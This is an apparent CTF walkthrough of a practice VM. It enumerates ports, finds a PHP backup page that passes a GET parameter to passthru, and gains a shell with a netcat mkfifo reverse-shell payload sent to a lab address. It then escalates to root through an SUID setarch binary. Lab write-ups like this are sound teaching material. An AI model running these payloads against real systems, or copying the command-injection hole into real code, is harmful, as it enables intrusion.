## Introduction
*Difficulty: Easy  
Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)  
Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).*

This is another easy rated box from the same people who made Chili.

## nmap
This time we get four ports:

1. 22/tcp    open  ssh
2. 80/tcp    open  http
3. 7755/tcp  open  unknown
4. 33060/tcp open  mysqlx

With a detail scan we find out that port 80 is running **nginx** and port 7755 is another HTTP server, but this time it's **apache**. Nmap isn't sure what port 33060 is, despite suggesting it may be *mysqlx*. 

# HTTP
Fuzzing for subdomains turns up nothing, and gobusting turns up just a single directory - */backup*. We get a picture of a cherry from the front page of the webservers, but this time I didn't bother with trying stego techniques on it. The two webservers appear basically identical, except on apache we can access */backup* whereas on nginx it's forbidden.

So, what's in backup? This stuff:

1.  command.php	2020-09-07 03:30 	293 	 
2.  latest.tar.gz	2020-09-01 18:54 	12M	 
3.  master.zip	2020-09-07 03:33 	11M	 
4.  master.zip.bak	2020-09-07 03:34 	11M	 

We download these files, and the interesting one is *command.php*. Here's what it contains:

{% highlight html %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backup</title>
</head>
<body>
<!-- </?php echo passthru($_GET['backup']); ?/> -->
</body>
</html>
{% endhighlight %}

Hmm. So what happens if we do this?:

``
http://192.168.1.81:7755/backup/command.php?backup=whoami
``

Response:
``
www-data
``

So this gives us our RCE. 

## Shell 
I used Burp Suite with the following payload:

``
GET /backup/command.php?backup=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.77+1235+>/tmp/f HTTP/1.1
``

to get a shell, and then I ran Linpeas.

## Privesc
It's an SUID binary; this time it's [setarch](https://gtfobins.github.io/gtfobins/setarch/#suid)

{% highlight shell %}
$ setarch $(arch) /bin/sh -p
whoami
root
cd /root
ls -lash

So yes, it was easy after all.
